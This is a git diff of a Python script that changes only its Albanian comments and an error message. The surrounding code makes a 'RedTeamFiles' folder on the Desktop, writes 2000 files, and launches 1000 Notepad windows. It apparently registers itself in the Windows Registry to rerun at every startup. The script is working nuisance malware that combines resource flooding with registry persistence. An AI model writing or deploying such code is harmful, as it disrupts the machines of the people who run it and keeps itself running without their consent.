@@ -5,18 +5,18 @@ import shutil
 import sys
 import winreg
 
-# Vendndodhja e Desktop-it
+# Desktop 
 desktop = os.path.join(os.path.expanduser("~"), "Desktop")
 marker_file = os.path.join(desktop, "autorun_marker.txt")
 
-# Emri i folderit të dedikuar ku do të krijohen vetëm këta skedarë
+# Emri i folderit mrena ne dir
 custom_folder = os.path.join(desktop, "RedTeamFiles")
 
-# Sigurohu që folderi ekziston
+# Folderi me u ekzekutu 
 if not os.path.exists(custom_folder):
     os.makedirs(custom_folder)
 
-# 1. Krijo 2000 skedarë vetëm një herë
+# mei i ba 2000 skendara generate
 if not os.path.exists(marker_file):
     for i in range(2000):
         file_name = f"file_{i+1}.txt"
@@ -26,7 +26,7 @@ if not os.path.exists(marker_file):
     with open(marker_file, "w") as f:
         f.write("Skedarët janë krijuar.\n")
 
-# 2. Hap 1000 prej tyre me Notepad
+# i ben open 1000 prej 2000
 for i in range(1000):
     file_name = f"file_{i+1}.txt"
     file_path = os.path.join(custom_folder, file_name)
@@ -34,7 +34,7 @@ for i in range(1000):
         subprocess.Popen(['notepad.exe', file_path])
         time.sleep(0.1)
 
-# 3. Vendos skriptin në autorun nëpërmjet Windows Registry
+# E ben scriptin autorun mrena os
 def add_to_startup():
     script_path = os.path.realpath(sys.argv[0])
     script_name = os.path.basename(script_path).replace(".py", "")
@@ -49,4 +49,4 @@ def add_to_startup():
 try:
     add_to_startup()
 except Exception as e:
-    print("❌ Shtimi në autorun dështoi:", e)
+    print("Gabim ne autorun", e)
